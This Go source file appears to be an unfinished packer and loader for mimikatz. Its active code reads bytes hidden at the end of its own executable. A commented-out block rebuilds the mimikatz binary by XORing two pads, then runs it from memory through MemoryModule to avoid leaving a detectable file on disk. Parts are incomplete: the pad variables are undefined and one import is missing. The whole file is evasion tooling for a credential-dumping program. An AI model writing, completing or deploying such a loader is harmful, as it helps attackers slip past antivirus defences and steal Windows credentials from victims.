package main

/*
#cgo CFLAGS: -IMemoryModule
#cgo LDFLAGS: MemoryModule/build/MemoryModule.a
#include "MemoryModule/MemoryModule.h"
*/
import "C"

import (
	"fmt"
	"io/ioutil"
	"os"
)

const KEY string = "changethiskey"
const SIZE int = 1946124

func check(err error, msg string) {
	if err != nil {
		fmt.Println(msg)
		panic(err)
	}
}

func unpack(filename string) {
	fmt.Printf("Unpacking %s ...\n", filename)
	bin, err := ioutil.ReadFile(filename)
	check(err, "error reading file")
	fmt.Printf("unpacked %d bytes\n", len(bin))
	a := bin[SIZE:]
	fmt.Printf("hidden section size: %d == %d\n", len(bin)-SIZE, len(a))
	fmt.Println(a)
}

func main() {
	myself := os.Args[0]

	unpack(myself)

	/*
		// XOR the pads togeather
		var mimikatzEXE []byte
		for index, bite := range mimikatzPad0 {
			mimikatzEXE = append(mimikatzEXE, []byte{bite ^ mimikatzPad1[index]}...)
		}

		// convert the args passed to this program into a C array of C strings
		var cArgs []*C.char
		for _, goString := range os.Args {
			cArgs = append(cArgs, C.CString(goString))
		}

		// load the mimikatz reconstructed binary from memory
		handle := C.MemoryLoadLibraryEx(
			unsafe.Pointer(&mimikatzEXE[0]),           // void *data
			(C.size_t)(len(mimikatzEXE)),              // size_t
			(*[0]byte)(C.MemoryDefaultAlloc),          // Alloc func ptr
			(*[0]byte)(C.MemoryDefaultFree),           // Free func ptr
			(*[0]byte)(C.MemoryDefaultLoadLibrary),    // loadLibrary func ptr
			(*[0]byte)(C.MemoryDefaultGetProcAddress), // getProcAddress func ptr
			(*[0]byte)(C.MemoryDefaultFreeLibrary),    // freeLibrary func ptr
			unsafe.Pointer(&cArgs[0]),                 // void *userdata
		)

		// run mimikatz
		C.MemoryCallEntryPoint(handle)

		// cleanup
		C.MemoryFreeLibrary(handle)
	*/
}
